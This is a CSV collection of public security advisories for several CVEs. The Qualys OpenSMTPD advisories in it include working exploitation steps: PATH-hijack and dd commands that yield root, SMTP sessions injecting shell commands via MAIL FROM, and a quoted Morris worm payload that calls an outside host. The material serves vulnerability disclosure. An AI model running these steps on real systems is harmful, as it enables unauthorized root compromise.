,Heading,CWE Number,CVE Number,Description
5,Cisco Unified Contact Center Express Privilege Escalation Vulnerability (CVE-2019-1888),,CVE-2019-1888,"I've quoted the Cisco summary below as it's pretty accurate.
tl;dr is an admin user on the web console can gain command execution
and then escalate to root. If this is an issue in your environment,
then please patch.
Thanks to Cisco PSIRT who were responsive and professional.
Shouts to Andrew, Dave and Senad, Pedro R - if that's still even a
thing on advisories.
Ref: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-uccx-privesc-Zd7bvwyf
""Summary
A vulnerability in the Administration Web Interface of Cisco Unified
Contact Center Express (Unified CCX) could allow an authenticated,
remote attacker to upload arbitrary files and execute commands on the
underlying operating system. To exploit this vulnerability, an
attacker needs valid Administrator credentials.
The vulnerability is due to insufficient restrictions for the content
uploaded to an affected system. An attacker could exploit this
vulnerability by uploading arbitrary files containing operating system
commands that will be executed by an affected system. A successful
exploit could allow the attacker to execute arbitrary commands with
the privileges of the web interface and then elevate their privileges
to root.""
cheers,
Jamie"
7,LPE and RCE in OpenSMTPD's default install (CVE-2020-8794),,CVE-2020-8794,"Qualys Security Advisory
LPE and RCE in OpenSMTPD's default install (CVE-2020-8794)
==============================================================================
Contents
==============================================================================
Summary
Analysis
...
Acknowledgments
==============================================================================
Summary
==============================================================================
We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
vulnerability, an out-of-bounds read introduced in December 2015 (commit
80c6a60c, ""when peer outputs a multi-line response ...""), is exploitable
remotely and leads to the execution of arbitrary shell commands: either
as root, after May 2018 (commit a8e22235, ""switch smtpd to new
grammar""); or as any non-root user, before May 2018.
Because this vulnerability resides in OpenSMTPD's client-side code
(which delivers mail to remote SMTP servers), we must consider two
different scenarios:
- Client-side exploitation: This vulnerability is remotely exploitable
in OpenSMTPD's (and hence OpenBSD's) default configuration. Although
OpenSMTPD listens on localhost only, by default, it does accept mail
from local users and delivers it to remote servers. If such a remote
server is controlled by an attacker (either because it is malicious or
compromised, or because of a man-in-the-middle, DNS, or BGP attack --
SMTP is not TLS-encrypted by default), then the attacker can execute
arbitrary shell commands on the vulnerable OpenSMTPD installation.
- Server-side exploitation: First, the attacker must connect to the
OpenSMTPD server (which accepts external mail) and send a mail that
creates a bounce. Next, when OpenSMTPD connects back to their mail
server to deliver this bounce, the attacker can exploit OpenSMTPD's
client-side vulnerability. Last, for their shell commands to be
executed, the attacker must (to the best of our knowledge) crash
OpenSMTPD and wait until it is restarted (either manually by an
administrator, or automatically by a system update or reboot).
We developed a simple exploit for this vulnerability and successfully
tested it against OpenBSD 6.6 (the current release), OpenBSD 5.9 (the
first vulnerable release), Debian 10 (stable), Debian 11 (testing), and
Fedora 31. At OpenBSD's request, and to give OpenSMTPD's users a chance
to patch their systems, we are withholding the exploitation details and
code until Wednesday, February 26, 2020.
Last-minute note: we tested our exploit against the recent changes in
OpenSMTPD 6.6.3p1, and our results are: if the ""mbox"" method is used for
local delivery (the default in OpenBSD -current), then arbitrary command
execution as root is still possible; otherwise (if the ""maildir"" method
is used, for example), arbitrary command execution as any non-root user
is possible.
==============================================================================
Analysis
==============================================================================
SMTP clients connect to SMTP servers and send commands such as EHLO,
MAIL FROM, and RCPT TO. SMTP servers respond with either single-line or
multiple-line replies:
- the first lines begin with a three-digit code and a hyphen ('-'),
followed by an optional text (for example, ""250-ENHANCEDSTATUSCODES"");
- the last line begins with the same three-digit code, followed by an
optional space (' ') and text (for example, ""250 HELP"").
In OpenSMTPD's client-side code, these multiline replies are parsed by
the mta_io() function:
------------------------------------------------------------------------------
1098 static void
1099 mta_io(struct io *io, int evt, void *arg)
1100 {
....
1133 case IO_DATAIN:
1134 nextline:
1135 line = io_getline(s->io, &len);
....
1146 if ((error = parse_smtp_response(line, len, &msg, &cont))) {
------------------------------------------------------------------------------
- the first lines (when line[3] == '-') are concatenated into a 2KB
replybuf:
------------------------------------------------------------------------------
1177 if (cont) {
1178 if (s->replybuf[0] == '')
1179 (void)strlcat(s->replybuf, line, sizeof s->replybuf);
1180 else {
1181 line = line + 4;
....
1187 (void)strlcat(s->replybuf, line, sizeof s->replybuf);
1188 }
1189 goto nextline;
1190 }
------------------------------------------------------------------------------
- the last line (when line[3] != '-') is also concatenated into
replybuf:
------------------------------------------------------------------------------
1195 if (s->replybuf[0] != '') {
1196 p = line + 4;
....
1201 if (strlcat(s->replybuf, p, sizeof s->replybuf) >= sizeof s->replybuf)
------------------------------------------------------------------------------
Unfortunately, if the last line's three-digit code is not followed by
the optional space and text, then p (at line 1196) points to the first
character *after* the line's '' terminator (which replaced the line's
' ' terminator in iobuf_getline()), and this out-of-bounds string is
concatenated into replybuf (at line 1201).
...
==============================================================================
Acknowledgments
==============================================================================
We thank OpenBSD's developers for their quick response and patches. We
also thank Gilles for his hard work and beautiful code.
[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us."
8,Local information disclosure in OpenSMTPD (CVE-2020-8793),,CVE-2020-8793,"Qualys Security Advisory
Local information disclosure in OpenSMTPD (CVE-2020-8793)
==============================================================================
Contents
==============================================================================
Summary
Analysis
Exploitation
POKE 47196, 201
Acknowledgments
==============================================================================
Summary
==============================================================================
We discovered a minor vulnerability in OpenSMTPD, OpenBSD's mail server:
an unprivileged local attacker can read the first line of an arbitrary
file (for example, root's password hash in /etc/master.passwd) or the
entire contents of another user's file (if this file and
/var/spool/smtpd/ are on the same filesystem).
We developed a proof of concept and successfully tested it against
OpenBSD 6.6 (the current release). This vulnerability is generally not
exploitable on Linux, because /proc/sys/fs/protected_hardlinks is 1 by
default on most distributions. Surprisingly, however, it is exploitable
on Fedora (31) and yields full root privileges.
==============================================================================
Analysis
==============================================================================
In October 2015 we published the results of an exhaustive OpenSMTPD
audit (https://www.qualys.com/2015/10/02/opensmtpd-audit-report.txt);
one of our key findings was:
------------------------------------------------------------------------------
Multiple hardlink attacks in the offline directory
...
In the world-writable ""/var/spool/smtpd/offline"" directory, local users
can create hardlinks to files they do not own, and wait until the server
reboots (or, crash OpenSMTPD with a denial-of-service and wait until the
administrator restarts it) to carry out assorted attacks.
...
2/ The following code in offline_enqueue() allows an attacker to
execvp() ""/usr/sbin/smtpctl"" as ""sendmail"", with a command-line argument
that is the hardlinked file's first line (CVE-2015-ABCD):
...
For example, an attacker can hardlink /etc/master.passwd to the offline
directory, and retrieve its first line (root's encrypted password) by
running ps (or a small program that simply calls sysctl() with
KERN_FILE_BYUID and KERN_PROC_ARGV) in a loop:
...
4/ If an attacker is able to reach another user's file (i.e., +x on all
directories that lead to the file) but not read it, he can hardlink the
file to the offline directory, and wait for savedeadletter() to create a
world-readable copy of the file in this other user's home directory:
------------------------------------------------------------------------------
OpenBSD's patch for this vulnerability was threefold:
a/ They removed the world-writable and sticky bits from
/var/spool/smtpd/offline, changed its group to ""_smtpq"", and made
/usr/sbin/smtpctl set-group-ID _smtpq:
------------------------------------------------------------------------------
drwxrwx--- 2 root _smtpq 512 Oct 12 10:34 /var/spool/smtpd/offline
-r-xr-sr-x 1 root _smtpq 217736 Oct 12 10:34 /usr/sbin/smtpctl
------------------------------------------------------------------------------
b/ They added an _smtpq group check to offline_scan():
------------------------------------------------------------------------------
1543 /* offline file group must match parent directory group */
1544 if (e->fts_statp->st_gid != e->fts_parent->fts_statp->st_gid)
1545 continue;
....
1553 if (offline_add(e->fts_name)) {
1554 log_warnx(""warn: smtpd: ""
1555 ""could not add offline message %s"", e->fts_name);
1556 continue;
1557 }
------------------------------------------------------------------------------
This check (at line 1544) effectively prevents offline_scan() from
adding the filename of a hardlink to the offline queue (at line 1553),
because no interesting file on the filesystem belongs to the group
_smtpq.
c/ They added a hardlink check to offline_enqueue() (at line 1631),
which is called by offline_add():
------------------------------------------------------------------------------
1615 if ((fd = open(path, O_RDONLY|O_NOFOLLOW|O_NONBLOCK)) == -1) {
1616 log_warn(""warn: smtpd: open: %s"", path);
1617 _exit(1);
1618 }
1619
1620 if (fstat(fd, &sb) == -1) {
1621 log_warn(""warn: smtpd: fstat: %s"", path);
1622 _exit(1);
1623 }
....
1631 if (sb.st_nlink != 1) {
1632 log_warnx(""warn: smtpd: file %s is hard-link"", path);
1633 _exit(1);
1634 }
------------------------------------------------------------------------------
Unfortunately, a/ is vulnerable to a Local Privilege Escalation (into
the group _smtpq), and b/ and c/ are vulnerable to TOCTOU (time-of-check
to time-of-use) race conditions. As a result, a local attacker can still
carry out the hardlink attacks 2/ (master.passwd) and 4/ (dead.letter)
described in our 2015 audit report.
==============================================================================
Exploitation
==============================================================================
a/ If we execute /usr/sbin/smtpctl as ""sendmail"" or ""send-mail"", and
specify a ""-bi"" command-line argument, then smtpctl calls execlp()
without dropping its privileges:
------------------------------------------------------------------------------
147 /* sendmail-compat makemap ... re-execute using proper interface */
148 if (argc == 2) {
...
164 execlp(""makemap"", ""makemap"", ""-d"", argv[0], ""-o"", dbname, ""-"",
165 (char *)NULL);
166 err(1, ""execlp"");
167 }
------------------------------------------------------------------------------
We can exploit this execlp() call by specifying our own PATH environment
variable, and obtain the privileges of the group _smtpq:
------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john)
$ ln -s /usr/sbin/smtpctl ""send-mail""
$ cat > makemap << ""EOF""
#!/bin/ksh
echo ""$@""
exec /usr/bin/env -i /bin/ksh
EOF
$ chmod 0755 makemap
$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -
$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
------------------------------------------------------------------------------
b/ The _smtpq group check is made only once in offline_scan(), but not
again in offline_enqueue() (which actually open()s the offline files).
Moreover, at most five offline files are processed concurrently; the
remaining files are simply added to the offline queue for later
processing. We can reliably win this first race condition:
- we create several large but sparse files (1GB each) in the offline
directory (these files naturally pass the _smtpq group check);
- we SIGSTOP five of the offline_enqueue() processes that open() and
slowly read() our large files;
- we wait until offline_scan() adds all of our remaining files to the
offline queue;
- we replace these files with hardlinks to an interesting target file
(for example, /etc/master.passwd);
- we SIGKILL the five stopped offline_enqueue() processes.
Finally, our hardlinks are processed by offline_enqueue(), and the
_smtpq group check is defeated.
c/ To defeat the hardlink check in offline_enqueue(), we create our
hardlink before the open() call at line 1615 (this increases st_nlink to
2), and delete it before the fstat() call at line 1620 (this decreases
st_nlink back to 1). In practice, we win this tight race condition after
just a few tries: our proof of concept fork()s a dedicated process that
simply calls link() and unlink() in a loop.
Moreover, if our target file is /etc/master.passwd, we can defeat the
hardlink check without a race: we hardlink /etc/master.passwd into the
offline directory (this increases st_nlink to 2), we run /usr/bin/passwd
or /usr/bin/chpass to generate a new /etc/master.passwd (this decreases
st_nlink back to 1), and finally we SIGKILL the five stopped
offline_enqueue() processes.
------------------------------------------------------------------------------
For example, to read the first line of /etc/master.passwd (root's
password hash) with our proof of concept:
- First, on the attacker's terminal:
$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
$ ./proof-of-concept 20
...
ready
- Next, on the administrator's terminal:
# rcctl restart smtpd
smtpd(ok)
smtpd(ok)
- Last, on the attacker's terminal:
...
root:$2b$10$xufPzZW36O2h2QmasLsjve8RyRQm0gu3mVX6IHE2nAYYD0Iw0gAnO:0:0:daemon:0:0:Charlie &:/root:/bin/ksh
------------------------------------------------------------------------------
To read the entire contents of another user's file (for example,
/home/admin/deep.secret) with our proof of concept:
- First, on the attacker's terminal:
$ id
uid=1001(john) gid=1001(john) egid=103(_smtpq) groups=1001(john)
$ ls -l /home/admin/deep.secret
---------- 1 admin admin 125 Feb 15 00:52 /home/admin/deep.secret
$ cat /home/admin/deep.secret
cat: /home/admin/deep.secret: Permission denied
$ ./proof-of-concept 100 /home/admin/deep.secret
...
ready
- Next, on the administrator's terminal:
# rcctl restart smtpd
smtpd(ok)
smtpd(ok)
- Last, on the attacker's terminal:
...
This is the contents of the deep.secret file. Only root may see this file.
-rw-r--r-- 1 admin admin 132 Feb 15 01:21 /home/admin/dead.letter
$ cat /home/admin/dead.letter
From: admin <admin obsd66 my domain>
Date: Sat, 15 Feb 2020 01:21:03 -0700 (MST)
secret 2
secret 3
end of secret file deep.secret
==============================================================================
POKE 47196, 201
==============================================================================
On Linux, this vulnerability is generally not exploitable because
/proc/sys/fs/protected_hardlinks prevents attackers from creating
hardlinks to files they do not own. On Fedora 31, however, smtpctl is
set-group-ID root, not set-group-ID smtpq:
------------------------------------------------------------------------------
-r-xr-sr-x. 1 root root 303368 Jul 26 2019 /usr/sbin/smtpctl
------------------------------------------------------------------------------
Surprisingly, we were able to exploit this mistake and obtain full root
privileges:
- First, we exploited the Local Privilege Escalation in smtpctl to
obtain the privileges of the group root:
------------------------------------------------------------------------------
$ id
uid=1001(john) gid=1001(john) groups=1001(john) context=...
$ ln -s /usr/sbin/smtpctl ""send-mail""
$ cat > makemap << ""EOF""
#!/bin/bash -p
echo ""$@""
exec /usr/bin/env -i /bin/bash -p
EOF
$ chmod 0755 makemap
$ env -i PATH=. ./send-mail -- -bi dbname
-d -bi -o dbname.db -
$ id
uid=1001(john) gid=1001(john) egid=0(root) groups=0(root),1001(john) context=...
------------------------------------------------------------------------------
- Next, we searched for files that belong to the group root, are
group-writable, but not world-writable:
------------------------------------------------------------------------------
$ find / -group root -perm -020 '!' -perm -02 -ls
...
4811008 0 drwxrwxr-x 2 root root 51 Feb 15 17:49 /var/lib/sss/mc
4811064 8212 -rw-rw-r-- 1 root root 8406312 Feb 15 18:58 /var/lib/sss/mc/passwd
4810978 6260 -rw-rw-r-- 1 root root 6406312 Feb 15 18:58 /var/lib/sss/mc/group
...
------------------------------------------------------------------------------
- Intrigued (""sss"" stands for ""System Security Services""), we dumped the
contents of /var/lib/sss/mc/passwd:
------------------------------------------------------------------------------
$ hexdump -C /var/lib/sss/mc/passwd
...
00000060 10 00 00 00 e9 03 00 00 e9 03 00 00 1d 00 00 00 |................|
00000070 6a 6f 68 6e 00 78 00 00 2f 68 6f 6d 65 2f 6a 6f |john.x../home/jo|
00000080 68 6e 00 2f 62 69 6e 2f 62 61 73 68 00 ff ff ff |hn./bin/bash....|
...
------------------------------------------------------------------------------
- Feeling adventurous, we overwrote ""e9 03 00 00"" (1001, our user-ID)
with zeros (root's user-ID):
------------------------------------------------------------------------------
$ dd if=/dev/zero of=/var/lib/sss/mc/passwd bs=1 seek=$((0x64)) count=4 conv=notrunc
4+0 records in
4+0 records out
------------------------------------------------------------------------------
- Last, we executed su to re-authenticate as ourselves (as user john),
but obtained a root shell instead:
------------------------------------------------------------------------------
$ su -l john
Password:
# id
uid=0(root) gid=1001(john) groups=1001(john) context=...
------------------------------------------------------------------------------
Last-minute note: on February 9, 2020, opensmtpd-6.6.2p1-1.fc31 was
released and correctly made smtpctl set-group-ID smtpq, instead of
set-group-ID root.
==============================================================================
Acknowledgments
==============================================================================
We thank OpenBSD's developers, Todd Miller in particular, for their
quick response and patches. We also thank Solar Designer and MITRE's CVE
Assignment Team.
[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us."
35,xglance-bin exploit (CVE-2014-2630),,CVE-2014-2630,"In one of our recent penetration tests we have abused a vulnerability affecting a suid binary called “xglance-bin“. Part of HP Performance Monitoring solution, it allowed us to escalate our local unprivileged sessions on some Linux RHEL 6.x/7.x/8.x systems to root. To be very honest, it was not the first time we leveraged that specific vulnerability as we abused it frequently on many HP servers with RHEL installed since 2014.
There has been indeed a CVE registered for the flaw ([CVE-2014-2630](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-2630)) originally discovered by Tim Brown from Portcullis. However the CVE description for it was a bit criptic (aka completely useless) -> “Unspecified vulnerability in HP Operations Agent 11.00, when Glance is used, allows local users to gain privileges via unknown vectors“.
Unspecified vulnerability? Unknown vector? Well… not that much. As there is no trace in the internet of a public exploit, we have decided to release it.
Full story here: https://redtimmysec.wordpress.com/2020/02/04/perf-exploiter/
Exploit here: https://github.com/redtimmy/perf-exploiter"
46,[CVE-2019-20358] CVE-2019-9491 in Trend Micro Anti-Threat Toolkit (ATTK) was NOT properly FIXED,,CVE-2019-20358,"Hi @ll,
on September 29, 2019, John Page reported a remote code execution
with escalation of privilege in TrendMicro's Anti-Threat Toolkit
to its vendor.
TrendMicro assigned CVE-2019-9491 to this vulnerability and told
the reporter, his dog and the world on October 18, 2019, that they
had fixed the vulnerable product.
See <https://success.trendmicro.com/solution/000149878>,
<https://seclists.org/fulldisclosure/2019/Oct/42> and
<http://hyp3rlinx.altervista.org/advisories/TREND-MICRO-ANTI-THREAT-TOOLKIT-(ATTK)-REMOTE-CODE-EXECUTION.txt>
TrendMicro's claim was but wrong, the vulnerability was NOT FIXED!
The files attk_ScanCleanOffline_gui_x86.exe, attk_collector_cli_x86.exe,
attk_ScanCleanOffline_gui_x64.exe and attk_collector_cli_x64.exe
offered on <https://spnsupport.trendmicro.com/> were STILL vulnerable,
as was their payload!
Vulnerability #1:
~~~~~~~~~~~~~~~~~
On a fully patched Windows 7 SP1, the executable self-extractors
attk_ScanCleanOffline_gui_x86.exe, attk_collector_cli_x86.exe,
attk_ScanCleanOffline_gui_x64.exe and attk_collector_cli_x64.exe
loaded and executed at least the following DLLs from their
""application directory"", typically the user's ""Downloads"" folder
%USERPROFILE%Downloads, instead from Windows' ""system directory""
%SystemRoot%System32
VERSION.dll, IPHLPAPI.dll, WINNSI.dll, WINHTTP.dll, WEBIO.dll,
DHCPCSVC.dll, CRYPTSP.dll, BCRYPT.dll, NCRYPT.dll, DNSAPI.dll,
RASADHLP.dll, PROPSYS.dll, APPHELP.dll
On other versions of Windows this list varied, but some DLLs were
ALWAYS loaded from the ""application directory""!
This BEGINNER's error is well-known and well-documented since MORE
than 20 years:
see <https://capec.mitre.org/data/definitions/471.html>,
<https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html>,
<https://blogs.msdn.microsoft.com/david_leblanc/2008/02/20/dll-preloading-attacks/>,
<https://insights.sei.cmu.edu/cert/2008/09/carpet-bombing-and-directory-poisoning.html>,
<http://www.binaryplanting.com/index.htm>,
<https://attack.mitre.org/wiki/Technique/T1073>,
<https://skanthak.homepage.t-online.de/sentinel.html>,
<https://skanthak.homepage.t-online.de/verifier.html>,
<https://skanthak.homepage.t-online.de/!execute.html>,
<https://skanthak.homepage.t-online.de/minesweeper.html>
Demonstration/Proof of concept:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Follow <https://skanthak.homepage.t-online.de/minesweeper.html>,
build a ""minefield"" of forwarder DLLs, then copy attk_*.exe into
the directory where you built the DLLs and execute it: enjoy the
multiple message boxes displayed from the forwarder DLLs.
Vulnerability #2:
~~~~~~~~~~~~~~~~~
On all versions of Windows, the batch script batCollector.bat,
unpacked from the executable extractors, which controls execution
of the TrendMicro AntiThreat Toolkit itself, executed
findstr.com/findstr.exe/findstr.bat/findstr.cmd
plus
REG.com/REG.exe/REG.bat/REG.cmd
(see the environment variable PATHEXT for the extensions) from
the directory
""TrendMicro AntiThreat ToolkitHC_ATTK""
where the batch script batCollector.bat lives:
--- batCollector.bat ---
| @echo off
| setlocal disableDelayedExpansion
| set wd=%~dp0
| cd /d %wd%
...
| for /f ""tokens=*"" %%a in ('findstr BatCollector= ....config.ini') do (
...
| REG EXPORT ...
...
findstr and REG are called in the script without file extension and
without path (although BOTH are well-known), so CMD.exe runs
findstr.com/findstr.exe/findstr.bat/findstr.cmd and
REG.com/REG.exe/REG.bat/REG.cmd from its ""current working directory""
""TrendMicro AntiThreat ToolkitHC_ATTK""
The missing path and extension are BEGINNER'S error #2.
Again see <https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html>
and <https://capec.mitre.org/data/definitions/471.html>
Vulnerability #3:
~~~~~~~~~~~~~~~~~
The executable self-extractors fail to restrict (at least write)
access to this directory for UNPRIVILEGED users, i.e. allow write
access only for members of the ""Administrators"" group: this is
BEGINNER'S error #3.
In standard installations of Windows, where the qUACkery-controlled
user account created during setup is used, this UNPROTECTED directory
is therefore writable by the UNPRIVILEGED user who can place a rogue
findstr.com/findstr.exe/findstr.bat/findstr.cmd and
REG.com/REG.exe/REG.bat/REG.cmd there ... and gains administrative
privileges!
Additionally an UNPRIVILEGED attacker can add arbitrary command
lines to the UNPROTECTED batch script batCollector.bat between its
creation and its execution, or replace it completely.
Again see <https://cwe.mitre.org/data/definitions/426.html>,
<https://cwe.mitre.org/data/definitions/427.html>
and <https://capec.mitre.org/data/definitions/471.html>,
plus <https://cwe.mitre.org/data/definitions/732.html>,
<https://cwe.mitre.org/data/definitions/377.html>,
<https://cwe.mitre.org/data/definitions/379.html>
and <https://capec.mitre.org/data/definitions/29.html>
stay tuned, and FAR AWAY from so-called security products:
their ""security"" is typically worse than that of the products
they claim to protect!
Stefan Kanthak
PS: the TrendMicro Anti-Threat Toolkit inspected in October 2019
was built from scrap: the developers used VisualStudio 2008
(end-of-life since two years), linked against an outdated and
vulnerable LIBCMT, shipped an outdated and vulnerable cURL 7.48
plus an outdated and vulnerable libeay32.dll 1.0.1.17 (OpenSSL
1.0.1 is end-of-life since more than 3 years; the last version
was 1.0.1.20).
This POOR (really: TOTAL lack of proper) software engineering
alone disqualifies this vendor and its ""security"" products!
JFTR: ""they'll never come back"" (really: developers SELDOM learn)
<https://seclists.org/fulldisclosure/2010/Sep/332>
<https://seclists.org/fulldisclosure/2015/Dec/128>
Timeline:
~~~~~~~~~
2019-10-23 sent reports for both vulnerabilities to vendor
2019-10-25 vendor acknowledged receipt
2020-01-07 CVE-2019-20358 assigned by vendor
2020-01-29 updated advisory published by vendor"
51,LPE and RCE in OpenSMTPD (CVE-2020-7247),,CVE-2020-7247,"Qualys Security Advisory
LPE and RCE in OpenSMTPD (CVE-2020-7247)
==============================================================================
Contents
==============================================================================
Summary
Analysis
Exploitation
Acknowledgments
==============================================================================
Summary
==============================================================================
We discovered a vulnerability in OpenSMTPD, OpenBSD's mail server. This
vulnerability is exploitable since May 2018 (commit a8e222352f, ""switch
smtpd to new grammar"") and allows an attacker to execute arbitrary shell
commands, as root:
- either locally, in OpenSMTPD's default configuration (which listens on
the loopback interface and only accepts mail from localhost);
- or locally and remotely, in OpenSMTPD's ""uncommented"" default
configuration (which listens on all interfaces and accepts external
mail).
We developed a simple proof of concept and successfully tested it
against OpenBSD 6.6 (the current release) and Debian testing (Bullseye);
other versions and distributions may be exploitable.
==============================================================================
Analysis
==============================================================================
OpenSMTPD's smtp_mailaddr() function is responsible for validating
sender (MAIL FROM) and recipient (RCPT TO) mail addresses:
------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191 const char *domain)
2192 {
....
2218 if (!valid_localpart(maddr->user) ||
2219 !valid_domainpart(maddr->domain)) {
....
2234 return (0);
2235 }
2236
2237 return (1);
2238 }
------------------------------------------------------------------------------
- it calls valid_domainpart() to validate the domain name (after the @
sign) of a mail address -- this function only accepts IPv4 and IPv6
addresses, and alpha-numeric, '.', '-', and '_' characters;
- it calls valid_localpart() to validate the local part (before the @
sign) of a mail address -- this function only accepts alpha-numeric,
'.', and MAILADDR_ALLOWED characters (a white list from RFC 5322):
71 #define MAILADDR_ALLOWED ""!#$%&'*/?^`{|}~+-=_""
Among the characters in MAILADDR_ALLOWED, the ones that are also in
MAILADDR_ESCAPE are later transformed into ':' characters (escaped) by
mda_expand_token():
72 #define MAILADDR_ESCAPE ""!#$%&'*?`{|}~""
smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping are
fundamental to OpenSMTPD's security -- they prevent dangerous characters
from reaching the shell that executes MDA commands (in mda_unpriv()):
execle(""/bin/sh"", ""/bin/sh"", ""-c"", mda_command, (char *)NULL,
mda_environ);
Mail Delivery Agents (MDAs) are responsible for delivering mail to local
recipients; for example, OpenSMTPD's default MDA method is ""mbox"", and
the corresponding MDA command is (in parse.y):
asprintf(&dispatcher->u.local.command,
""/usr/libexec/mail.local -f %%{mbox.from} %%{user.username}"");
where %{user.username} is the name of an existing local user (the local
part of the recipient address), and %{mbox.from} is the sender address
(which would be under the complete control of an attacker if it were not
for smtp_mailaddr()'s white-listing and mda_expand_token()'s escaping).
Unfortunately, we discovered a vulnerability in smtp_mailaddr()
(CVE-2020-7247):
------------------------------------------------------------------------------
2189 static int
2190 smtp_mailaddr(struct mailaddr *maddr, char *line, int mailfrom, char **args,
2191 const char *domain)
2192 {
....
2218 if (!valid_localpart(maddr->user) ||
2219 !valid_domainpart(maddr->domain)) {
....
2229 if (maddr->domain[0] == '') {
2230 (void)strlcpy(maddr->domain, domain,
2231 sizeof(maddr->domain));
2232 return (1);
2233 }
2234 return (0);
2235 }
2236
2237 return (1);
2238 }
------------------------------------------------------------------------------
If the local part of an address is invalid (line 2218) and if its domain
name is empty (line 2229), then smtp_mailaddr() adds the default domain
automatically (line 2230) and returns 1 (line 2232), although it should
return 0 because the local part of the address is invalid (for example,
because it contains invalid characters).
As a result, an attacker can pass dangerous characters that are not in
MAILADDR_ALLOWED and not in MAILADDR_ESCAPE (';' and ' ' in particular)
to the shell that executes the MDA command. For example, the following
local SMTP session executes ""sleep 66"" as root, in OpenSMTPD's default
configuration:
------------------------------------------------------------------------------
$ nc 127.0.0.1 25
220 obsd66.example.org ESMTP OpenSMTPD
HELO professor.falken
250 obsd66.example.org Hello professor.falken [127.0.0.1], pleased to meet you
MAIL FROM:<;sleep 66;>
250 2.0.0 Ok
RCPT TO:<root>
250 2.1.5 Destination address valid: Recipient ok
DATA
354 Enter mail, end with ""."" on a line by itself
How about a nice game of chess?
.
250 2.0.0 e6330998 Message accepted for delivery
QUIT
221 2.0.0 Bye
------------------------------------------------------------------------------
==============================================================================
Exploitation
==============================================================================
Nevertheless, our ability to execute arbitrary shell commands through
the local part of the sender address is rather limited:
- although OpenSMTPD is less restrictive than RFC 5321, the maximum
length of a local part should be 64 characters;
- the characters in MAILADDR_ESCAPE (for example, '$' and '|') are
transformed into ':' characters.
To overcome these limitations, we drew inspiration from the Morris worm
(https://spaf.cerias.purdue.edu/tech-reps/823.pdf), which exploited the
DEBUG vulnerability in Sendmail by executing the body of a mail as a
shell script:
------------------------------------------------------------------------------
debug
mail from: </dev/null>
rcpt to: <""|sed -e '1,/^$/'d | /bin/sh ; exit 0"">
data
cd /usr/tmp
cat > x14481910.c <<'EOF'
[text of vector program]
EOF
cc -o x14481910 x14481910.c;x14481910 128.32.134.16 32341 8712440;
rm -f x14481910 x14481910.c
.
quit
------------------------------------------------------------------------------
Indeed, the standard input of an MDA command is the mail itself: ""sed""
removes the headers (which were added automatically by the mail server)
and ""/bin/sh"" executes the body.
We cannot simply reuse this command (because we cannot use the '|' and
'>' characters), but we can use ""read"" to remove N header lines (where N
is greater than the number of header lines added by the mail server) and
prepend a ""NOP slide"" of N comment lines to the body of our mail. For
example, the following remote SMTP session executes the body of our
mail, as root, in OpenSMTPD's ""uncommented"" default configuration:
------------------------------------------------------------------------------
$ nc 192.168.56.143 25
220 obsd66.example.org ESMTP OpenSMTPD
HELO professor.falken
250 obsd66.example.org Hello professor.falken [192.168.56.1], pleased to meet you
MAIL FROM:<;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>
250 2.0.0 Ok
RCPT TO:<root example org>
250 2.1.5 Destination address valid: Recipient ok
DATA
354 Enter mail, end with ""."" on a line by itself
#0
#1
#2
#3
#4
#5
#6
#7
#8
#9
#a
#b
#c
#d
for i in W O P R; do
echo -n ""($i) "" && id || break
done >> /root/x.""`id -u`"".""$$""
.
250 2.0.0 4cdd24df Message accepted for delivery
QUIT
221 2.0.0 Bye
------------------------------------------------------------------------------
==============================================================================
Acknowledgments
==============================================================================
We thank the OpenBSD developers for their great work and their quick
response.
[https://d1dejaj6dcqv24.cloudfront.net/asset/image/email-banner-384-2x.png]<https://www.qualys.com/email-banner>
This message may contain confidential and privileged information. If it has been sent to you in error, please reply to advise the sender of the error and then immediately delete it. If you are not the intended recipient, do not read, copy, disclose or otherwise use this message. The sender disclaims any liability for such unauthorized use. NOTE that all incoming emails sent to Qualys email accounts will be archived and may be scanned by us and/or by external service providers to detect and prevent threats to our systems, investigate illegal or inappropriate behavior, and/or eliminate unsolicited promotional emails (“spam”). If you have any concerns about this process, please contact us."
62,CVE - CVE-2020-7799 - FusionAuth command execution via Apache Freemarker Template,,CVE-2020-7799,"Dear bugtraq,
Please find attached an advisory for the following vulnerability, "" FusionAuth command execution via Apache Freemarker Template"".
Description: An authenticated attacker with enough privileges to access the template editing functions (either site templates or e-mail templates) in the FusionAuth dashboard can execute commands on the underlying operating system using the Apache FreeMarker Expression language.
For further information, please refer to:
https://lab.mediaservice.net/advisory/2020-03-fusionauth.txt

-------------------------------------------------------------------------
Gianluca Baldi,  Security Advisor                  
Offensive Security Certified Professional (OSCP)
